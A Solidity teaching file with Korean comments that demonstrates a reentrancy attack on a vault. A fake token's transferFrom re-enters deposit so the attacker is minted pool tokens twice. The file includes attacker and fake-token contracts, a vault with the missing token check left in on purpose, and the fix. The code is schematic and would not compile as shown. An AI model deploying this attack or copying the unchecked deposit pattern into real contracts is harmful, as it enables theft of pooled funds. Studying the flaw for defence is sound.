// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.18;
/*
fakeToken을 활용한 재진입 공격. 
이 문서에 총 4개의 contract이 있음. 
1. TargetVault: deposit을 받아서 pooltoken을 mint해줌. attacker의 공격대상. 
2. Attacker: 공격자의 contract. 
3. FakeToken: 공격자가 만들어낸 토큰. deposit 대상이 아니기 때문에 deposit 해도 보상(pool token)을 받을 수 없음.
4. GoodToken: 정상적인 ERC20 토큰. deposit 대상.

공격과정은 아래처럼 진행됨. 
1. attacker가 TargetVault의 deposit() 함수를 호출해서 매개변수로 (fakeTokenAddress, 수량)을 입력. 
2. TargetVault는 받은 fakeTokenAddress로 transferFrom()을 호출해서 fakeToekn을 받음. 
3. faketoken의 transferFrom() 함수는 TargetVault의 deposit(goodTokenAddress, 수량)으로 다시 호출.
4. TargetVault는 받은 goodTokenAddress로 transferFrom()을 호출해서 goodToekn을 받음.
5. TargetVault는 현재 goodToken.balanceOf(this)와 과거값의 차이만큼 poolToken을 발행해줌. 
6. 이 함수에 총 2회 진입했기 때문에 context가 2개 실행되고 있으므로 5번도 1번 더 실행 됨. 
7. attacker는 goodtoken 보낸 수량의 2배 만큼의 pooltoken을 받았음. 

Eth의 send/call/transfer가 아닌 token의 transfer도 재진입 루트로 쓰일 수 있음. 
deposit()을 받을 때, deposit의 대상(여기서는 goodToken)이 맞는지 확인하는 과정이 필요함. 
예를 들어, require(_receivedToken == goodTokenAddress, "invaild deposit");
경우에 따라서 reentrancy를 막을 수 있는 modifier를 쓸 수도 있음. 
*/

contract TargetVault {
    /*
    TargetVault는 deposit으로 goodToken을 받고 poolToken을 mint해줌. 
    여기서는 Attacker가 TargetVault를 어떻게 공격하는가를 보기 위해서 공격에 이용된
    deposit(), _mint() 함수 외의 다른 부분은 모두 생략했음. 
    */
    
    uint public goodTokenBalance;
    //goodToken의 address를 입력.
    address public goodTokenAddress= 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;
    
    function deposit(address _receivedToken, uint _amount) external returns(bool) {
        _receivedToken.transferFrom(msg.sender, address(this), _amount);
        uint amount = goodTokenAddress.balanceOf(this) - goodTokenBalance;
        require(amount > 0, "invaild deposit");
        _mint(amount);
        goodTokenBalance = goodTokenAddress.balanceOf(this);
    }
    
    function _mint(uint _amount) internal {
        balanceOf[msg.sender] += _amount;
        totalSupply += _amount;
    }
}



contract Attacker {
    /*
    공격자는 이 컨트랙을 통제하고 자금을 자신의 다른 계정으로 보내기 위해서
    onlyOwner modifier와 transfer 함수가 필요함. 
    여기서는 공격에 필요한 핵심 기능만 보여주기 위해서 생략했음. 
    */
    constructor(address _addr0, address _addr1) {
        targetAddress = _addr0;
        fakeTokenAddress = _addr1;
        owner = msg.sender;
    }
    
    address private targetAddress;
    address private fakeTokenAddress;

    function attack(uint _amount) public onlyOwner view {
        targetAddress.deposit(fakeTokenAddress, _amount);
    }
}



contract FakeToken is IERC20 {
    /*
    FakeToken은 Target contract이 FakeToken.trasferFrom()을 호출하면
    Target의 deposit 함수를 호출해 GoodToken을 다시 보냄으로써 재진입함. 
    GoodToken과 FakeToken의 차이점을 보여주기 위해서 transferFrom 함수 외의 
    다른 함수는 모두 생략했음. 
    */
    constructor(address _addr0, address _addr1) {
        targetAddress = _addr0;
        goodTokenAddress = _addr1;
    }
    
    address public targetAddress;
    address public goodTokenAddress;

    function transferFrom(address _sender, address _recipient, uint _amount) external {
        allowance[_sender][msg.sender] -= _amount;
        balanceOf[_sender] -= _amount;
        balanceOf[_recipient] += _amount;
        targetAddress.deposit(goodTokenAddress, amount);
    }

}


contract GoodToken is IERC20 {
    /* 
    GoodToken과 FakeToken의 차이점을 보여주기 위해서 transferFrom 함수 외의 
    다른 함수는 모두 생략했음. 
    */
    function transferFrom(address sender, address recipient, uint amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}



// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol
interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}